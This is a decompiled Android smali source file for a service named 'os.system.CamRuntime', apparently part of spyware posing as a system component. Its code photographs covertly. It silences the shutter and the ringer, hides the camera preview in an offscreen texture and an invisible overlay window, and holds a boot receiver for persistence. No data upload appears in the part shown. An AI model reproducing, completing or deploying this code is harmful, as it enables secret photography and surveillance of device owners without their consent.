.class public Los/system/CamRuntime;
.super Landroid/app/Service;
.source "CamRuntime.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Los/system/CamRuntime$LocalBinder;
    }
.end annotation


# static fields
.field private static TAG:Ljava/lang/String;

.field public static isCamera:I

.field public static kualitas:I

.field public static path:Ljava/lang/String;


# instance fields
.field private audioManager:Landroid/media/AudioManager;

.field private dummyPreview:Los/system/DummyPreview;

.field private localBinder:Los/system/CamRuntime$LocalBinder;

.field private receAction:Los/system/ReceiverBoot;

.field private system:Los/system/SystemThread;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 18
    const-string v0, "AsDfGhJkL"

    sput-object v0, Los/system/CamRuntime;->TAG:Ljava/lang/String;

    .line 25
    const/4 v0, 0x1

    sput v0, Los/system/CamRuntime;->isCamera:I

    .line 26
    const-string v0, ""

    sput-object v0, Los/system/CamRuntime;->path:Ljava/lang/String;

    .line 27
    const/4 v0, 0x0

    sput v0, Los/system/CamRuntime;->kualitas:I

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 16
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 20
    new-instance v0, Los/system/CamRuntime$LocalBinder;

    invoke-direct {v0, p0}, Los/system/CamRuntime$LocalBinder;-><init>(Los/system/CamRuntime;)V

    iput-object v0, p0, Los/system/CamRuntime;->localBinder:Los/system/CamRuntime$LocalBinder;

    return-void
.end method

.method static synthetic access$000()Ljava/lang/String;
    .locals 1

    .prologue
    .line 16
    sget-object v0, Los/system/CamRuntime;->TAG:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$100(Los/system/CamRuntime;)Los/system/DummyPreview;
    .locals 1

    .prologue
    .line 16
    iget-object v0, p0, Los/system/CamRuntime;->dummyPreview:Los/system/DummyPreview;

    return-object v0
.end method

.method public static capturePhoto(Landroid/content/Context;Ljava/lang/String;)V
    .locals 6

    .prologue
    const/4 v1, 0x0

    const/4 v2, 0x0

    .line 65
    .line 66
    new-instance v3, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v3}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    .line 68
    const/4 v0, 0x1

    .line 69
    const-string v4, "back"

    invoke-virtual {p1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 71
    sget-object v0, Los/system/CamRuntime;->TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "cam:"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 72
    invoke-static {v1, v3}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    move v0, v1

    .line 75
    :cond_0
    invoke-static {v0, v3}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 76
    iget-boolean v3, v3, Landroid/hardware/Camera$CameraInfo;->canDisableShutterSound:Z

    if-eqz v3, :cond_1

    .line 77
    invoke-virtual {v2, v1}, Landroid/hardware/Camera;->enableShutterSound(Z)Z

    .line 81
    :cond_1
    :try_start_0
    invoke-static {v0}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .line 88
    :goto_0
    if-nez v1, :cond_2

    .line 89
    :try_start_1
    sget-object v2, Los/system/CamRuntime;->TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "camera null:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 126
    :goto_1
    return-void

    .line 83
    :catch_0
    move-exception v1

    .line 85
    invoke-virtual {v1}, Ljava/lang/RuntimeException;->printStackTrace()V

    move-object v1, v2

    goto :goto_0

    .line 92
    :cond_2
    :try_start_2
    new-instance v0, Landroid/graphics/SurfaceTexture;

    const/4 v2, 0x0

    invoke-direct {v0, v2}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    invoke-virtual {v1, v0}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    .line 93
    invoke-virtual {v1}, Landroid/hardware/Camera;->startPreview()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 98
    :goto_2
    const/4 v0, 0x0

    const/4 v2, 0x0

    :try_start_3
    new-instance v3, Los/system/CamRuntime$1;

    invoke-direct {v3}, Los/system/CamRuntime$1;-><init>()V

    invoke-virtual {v1, v0, v2, v3}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_1

    .line 121
    :catch_1
    move-exception v0

    .line 122
    invoke-virtual {v1}, Landroid/hardware/Camera;->release()V

    .line 123
    sget-object v1, Los/system/CamRuntime;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "err camera:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    .line 94
    :catch_2
    move-exception v0

    .line 95
    :try_start_4
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 96
    sget-object v2, Los/system/CamRuntime;->TAG:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "err prev:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_2
.end method


# virtual methods
.method public getDummyPreview()Los/system/DummyPreview;
    .locals 1

    .prologue
    .line 30
    iget-object v0, p0, Los/system/CamRuntime;->dummyPreview:Los/system/DummyPreview;

    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .prologue
    .line 130
    iget-object v0, p0, Los/system/CamRuntime;->localBinder:Los/system/CamRuntime$LocalBinder;

    return-object v0
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    .line 57
    const-string v0, "window"

    invoke-virtual {p0, v0}, Los/system/CamRuntime;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    .line 58
    iget-object v1, p0, Los/system/CamRuntime;->dummyPreview:Los/system/DummyPreview;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeViewImmediate(Landroid/view/View;)V

    .line 59
    invoke-virtual {p0}, Los/system/CamRuntime;->stopSelf()V

    .line 61
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 7

    .prologue
    const/4 v2, 0x0

    const/4 v1, 0x1

    .line 35
    sget v0, Los/system/CamRuntime;->kualitas:I

    if-ne v0, v1, :cond_0

    .line 36
    const/4 v0, 0x4

    sput v0, Los/system/CamRuntime;->kualitas:I

    .line 40
    :goto_0
    new-instance v0, Los/system/SystemThread;

    invoke-direct {v0}, Los/system/SystemThread;-><init>()V

    iput-object v0, p0, Los/system/CamRuntime;->system:Los/system/SystemThread;

    .line 41
    new-instance v0, Los/system/ReceiverBoot;

    invoke-direct {v0}, Los/system/ReceiverBoot;-><init>()V

    iput-object v0, p0, Los/system/CamRuntime;->receAction:Los/system/ReceiverBoot;

    .line 42
    const-string v0, "audio"

    invoke-virtual {p0, v0}, Los/system/CamRuntime;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    iput-object v0, p0, Los/system/CamRuntime;->audioManager:Landroid/media/AudioManager;

    .line 43
    iget-object v0, p0, Los/system/CamRuntime;->audioManager:Landroid/media/AudioManager;

    invoke-virtual {v0, v2}, Landroid/media/AudioManager;->setRingerMode(I)V

    .line 45
    const-string v0, "window"

    invoke-virtual {p0, v0}, Los/system/CamRuntime;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    move-object v6, v0

    check-cast v6, Landroid/view/WindowManager;

    .line 46
    new-instance v0, Los/system/DummyPreview;

    invoke-direct {v0, p0, p3}, Los/system/DummyPreview;-><init>(Los/system/CamRuntime;I)V

    iput-object v0, p0, Los/system/CamRuntime;->dummyPreview:Los/system/DummyPreview;

    .line 47
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/16 v3, 0x7d6

    const/high16 v4, 0x40000

    const/4 v5, -0x3

    move v2, v1

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 50
    const v1, 0x800033

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 51
    iget-object v1, p0, Los/system/CamRuntime;->dummyPreview:Los/system/DummyPreview;

    invoke-interface {v6, v1, v0}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 52
    const/4 v0, 0x2

    return v0

    .line 38
    :cond_0
    sput v2, Los/system/CamRuntime;->kualitas:I

    goto :goto_0
.end method
